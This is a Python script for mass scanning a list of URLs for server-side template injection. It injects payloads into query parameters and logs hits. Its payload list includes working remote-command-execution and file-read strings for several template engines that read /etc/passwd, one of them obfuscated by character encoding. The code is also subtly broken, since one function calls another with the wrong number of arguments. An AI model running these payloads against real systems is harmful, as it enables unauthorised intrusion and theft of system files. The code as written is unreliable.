from concurrent.futures import ThreadPoolExecutor
from queue import Queue
from urllib.parse import  urlparse, parse_qs,urlencode
import  urllib
import requests
import threading
import optparse


def replace_param(URL,payload,queue):
    parse = urlparse(URL)
    for i in parse_qs(parse.query):
        query = parse_qs(parse.query)
        query[i] = [payload]
        for i in query:
            query[i] = query[i][0]
        q = urlencode(query, doseq=True)
        a = "{}://{}?{}".format(parse[0], parse[1], q)
        inspect(a,"ssti81",queue,payload)

def parameter_all_in_one(URL,payload,queue):
    parameters = {
                    "template" : payload ,
                    "preview" : payload ,
                    "id" : payload ,
                    "view" : payload ,
                    "activity" : payload ,
                    "name" : payload ,
                    "content" : payload ,
                    "redirect" : payload
                  }

    param =urllib.parse.urlencode(parameters, doseq=True)
    URL = "{}?{}".format(URL.split('?')[0],param)
    inspect(URL,queue,payload)

def inspect(url,queue,payload):
    response = requests.get(url)
    if "ssti81" in response.text or "root:x:0" in response.text :
        result = []
        result.append(url)
        result.append(payload)
        queue.put(result)


def inspect_all_payload(url,queue, payload):
    response = requests.get(url)
    if "ssti81" in response.text or "root:x:0" in response.text :
        result = []
        result.append(url)
        result.append(payload)
        queue.put(result)


def done(queue,output,stop_event):
    GREEN = '\033[32m'
    RESET = '\033[0m'
    with open(output, 'w') as out:
        while not stop_event.is_set():
            result = queue.get()
            msg = "[ {}{}{} ] {}".format(GREEN,result[1],RESET,result[0])
            print(msg)
            out.write(msg)
def main_function(url,queue):
    payloads = [
        "ssti{{9*9}}",
        "${9*9}",
        "ssti<%= 9 * 9 %>",
        "${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}",
        "{{‘’.__class__.__mro__[2].__subclasses__()[40](‘/etc/passwd’).read()}}",
        "<%= File.open('/etc/passwd').read %>",
        "<%= IO.popen('cat /etc/passwd').readlines()  %>",
        "${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')",
        "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}",
        "{{7*'7'}}",
        "\"{{'/etc/passwd'|file_excerpt(1,30)}}\"@"
    ]
    for payload in payloads:
        replace_param(url,payload,queue)
        parameter_all_in_one(url,payload,queue)


def pool(filename,threads,output):
    print("urls_path={}              threads={} ".format(filename,threads))
    queue= Queue()
    stop_event =threading.Event()
    t=threading.Thread(target=done,args=(queue,output,stop_event),daemon=True)
    t.start()
    Lines = open(filename, 'r').readlines()
    with ThreadPoolExecutor(max_workers=threads) as executor:
            for i in Lines:
                 url = i.replace("\n", "")
                 executor.submit(main_function,url,queue)
                 # executor.submit(parameter_all_in_one,url,payload,queue)

    stop_event.set()


def Main():
    parser = optparse.OptionParser(" help: " +\
                                   "ssti_header -f <url_fielname>  -t <threads_number>")
    parser.add_option("-f",dest="filename",type="string",help="spicify file of urls")
    parser.add_option("-t",dest="threads",type="int",help="spicify nybmer of threads")
    parser.add_option("-o",dest="output",type="int",help="spicify output file ")
    # parser.add_option("-p",dest="payload",type="string",help="spicify pyaload")

    (options ,args) = parser.parse_args()

    threads = 10
    output = "ssti_rapport.txt"
    if (options.filename == None ):
        print(parser.usage)
        exit(1)
    else:
        filename = options.filename
        if (options.threads != None):
            threads = options.threads
        if (options.output != None):
            output = options.output


    pool(filename,threads,output)



if __name__ == '__main__':
    Main()

